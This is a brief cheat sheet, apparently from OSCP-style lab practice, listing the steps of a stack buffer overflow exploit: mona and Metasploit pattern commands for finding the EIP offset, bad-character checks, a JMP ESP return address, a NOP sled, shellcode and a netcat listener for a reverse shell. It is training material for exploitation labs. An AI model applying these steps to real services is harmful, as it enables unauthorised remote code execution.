# BufferOverflow

Buffer overflow steps

xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
!mona config -set working folder c:\mona\%p

1. FUZZ w/ correct IP address + port
2. /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (fuzz + 400)
3. Run exploit.py with above payload in payload var
4. !mona findmsp -distance (fuzz + 400) (finds EIP offset)
5. Put offset in exploit.py + BBBB + remove payload
6. !mona bytearray -b "\x00"
7. Run bad chars script, set payload to this
8. Run exploit, get ESP address
9. !mona compare -f C:\mona\oscp\bytearray.bin -a ESPAddress (check if chars are actually bad or not)
10. !mona bytearray -b "\x00\x07\x2e\xa0" (look for unmodified)
11. !mona jmp -r esp -cpb "\x00\x07\x2e\xa0" (or whatever bad chars)
12. Put address in return var (0x625011af should be written as \xAF\x11\x50\x62)
13. padding = "\x90" * 16
14. Run shellcode
15. Insert shellcode into exploit.py
16. Nc -nlvp 4444
17. Run program, run exploit.py
